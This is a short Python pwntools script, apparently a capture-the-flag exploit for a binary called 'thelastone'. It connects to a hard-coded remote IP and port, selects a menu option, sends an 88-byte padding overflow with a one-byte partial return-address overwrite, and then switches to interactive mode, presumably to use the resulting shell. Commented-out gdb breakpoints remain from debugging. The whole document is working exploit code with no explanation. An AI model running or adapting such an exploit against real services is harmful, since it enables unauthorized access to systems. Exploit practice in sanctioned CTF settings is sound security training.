from pwn import *

exe = context.binary = ELF('./thelastone', checksec=False)

# r = exe.process()
# gdb.attach(r, api=True, gdbscript='''
#            b*0x00000000004014be
#            b*0x0000000000401519
#            b*0x0000000000401504
#            ''')

r = remote('159.89.197.210', 9995)

r.sendlineafter(b'> ', b'5')

name = b'a'*88 + b'\x6c'
r.sendlineafter(b'> ', name)

r.interactive()